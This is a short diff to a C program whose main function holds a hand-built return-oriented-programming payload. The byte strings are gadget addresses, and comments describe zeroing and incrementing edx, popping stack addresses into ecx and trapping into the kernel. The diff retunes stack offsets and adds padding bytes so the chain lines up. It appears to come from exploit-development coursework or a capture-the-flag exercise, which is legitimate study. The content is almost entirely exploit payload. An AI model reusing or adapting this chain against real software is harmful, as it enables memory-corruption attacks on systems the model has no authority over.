@@ -83,11 +83,12 @@ int main(void)
                       ""
                       "\xD4\xBE\xB3\xBB" // 0 out edx
                       "\x8a\xb8\xb7\xbb" // inc edx
-                      "\x22\xA4\xBA\xBB\x04\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 1 word) 
+                      "\x22\xA4\xBA\xBB\x08\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 1 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (1 word) to stack
                       "\x8a\xb8\xb7\xbb" // inc edx
                       "\x8a\xb8\xb7\xbb" // inc edx now value 3
-                      "\x22\xA4\xBA\xBB\x00\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
+                      "\x09\x09\x09\x09"
+                      "\x22\xA4\xBA\xBB\x04\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (3 word) to stack
                       "\xE5\xB6\xA9\xBB" // trap into kernel
                       "\x62\x26\xb4\xbb" // add 8 to esp to skip params on stack
@@ -97,10 +98,10 @@ int main(void)
                       "\xD4\xBE\xB3\xBB" // 0 out edx
                       "\x8a\xb8\xb7\xbb" // inc edx
                       "\x8a\xb8\xb7\xbb" // inc edx
-                      "\x22\xA4\xBA\xBB\x3c\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 2 word) 
+                      "\x22\xA4\xBA\xBB\x40\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 2 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (2 word) to stack
                       "\x8a\xb8\xb7\xbb" // inc edx now value 3
-                      "\x22\xA4\xBA\xBB\x38\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
+                      "\x22\xA4\xBA\xBB\x3c\x2a\xbf\xbf" // pop the addy esp stores into ecx (future address of 3 word) 
                       "\x7E\xB8\xB6\xBB" // move edx (3 word) to stack
                       "\xE5\xB6\xA9\xBB" // trap into kernel
                       "\x62\x26\xb4\xbb" // add 8 to esp to skip params on stack
